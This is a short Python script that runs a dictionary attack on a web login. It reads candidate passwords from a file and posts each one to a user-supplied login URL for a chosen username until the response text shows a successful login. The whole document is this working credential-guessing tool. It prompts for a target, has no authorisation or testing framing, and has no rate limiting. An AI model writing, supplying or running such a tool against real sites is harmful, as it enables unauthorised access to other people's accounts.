import requests

def try_passwords(username, password_file_path, url):
    # Read passwords from the file
    with open(password_file_path, 'r') as file:
        passwords = file.read().splitlines()

    for password in passwords:
        # Attempt to log in
        response = requests.post(url, data={'username': username, 'password': password})

        # Check for successful login (you may need to adjust the success condition based on the site)
        if "Login successful" in response.text:  # Adjust based on the success message
            print(f"Correct password found: {password}")
            return password

    print("No correct password found.")
    return None

# Example of how to use the tool
username = input("Enter the username: ")
password_file_path = input("Enter the path to the password file: ")
url = input("Enter the login URL: ")

try_passwords(username, password_file_path, url)
